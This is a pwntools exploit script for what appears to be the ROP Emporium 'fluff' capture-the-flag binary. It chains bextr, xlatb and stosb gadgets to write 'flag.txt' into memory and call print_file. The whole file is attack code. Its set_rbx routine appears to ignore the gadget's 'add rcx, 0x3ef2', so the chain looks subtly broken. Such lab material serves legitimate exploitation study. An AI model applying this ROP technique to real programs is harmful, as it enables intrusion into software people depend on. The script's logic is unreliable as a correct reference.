from pwn import *

#  --------------------------- 工作流程 ---------------------------------
# bextr -> xlatb -> stosb
# Put the address of a byte we want to read into rbx using gadget2(bextr)
# Read the byte at that ebx and place it into al with gadget1(xlabt)
# Write byte in al to an address with gadget3(stosb)
# 用 ROPgadget 拉長深度並找「pop rdx ; pop rcx」
# ROPgadget --binary ./fluff --depth 20 | grep -i 'pop rdx ; pop rcx'

elf = context.binary = ELF('./fluff')
p = process()

gadget1 = 0x0000000000400628 # xlatb; ret
gadget2 =  0x000000000040062a # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
gadget3 = 0x0000000000400639 # stosb byte ptr [rdi] al; ret

print_file = 0x00400510
bss = 0x601038
pop_rdi = 0x00000000004006a3 

al = 11 # initial value 

char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}

def set_rbx(addr):
    payload = b""
    rdx = p8(32) + p8(32) + p16(0) + p32(0)
    rcx = p32(0) + p32(addr)
    payload += p64(gadget2) + rdx + rcx 
    return payload 

def write_byte(addr, char, offset):
    global al

    payload = set_rbx(addr-al)
    payload += p64(gadget1)
    al = ord(char)
    rdi = p64(bss + offset)
    payload += p64(pop_rdi) + rdi + p64(gadget3)
    return payload  

payload = b"A"*40
target_str = "flag.txt"


for i in range(len(target_str)):
    c = target_str[i]
    payload += write_byte(char_map[c],c,i)

payload += p64(pop_rdi) + p64(bss) + p64(print_file)
p.recvuntil('> ')
p.sendline(payload)
print(p.clean().decode('latin-1'))
p.interactive()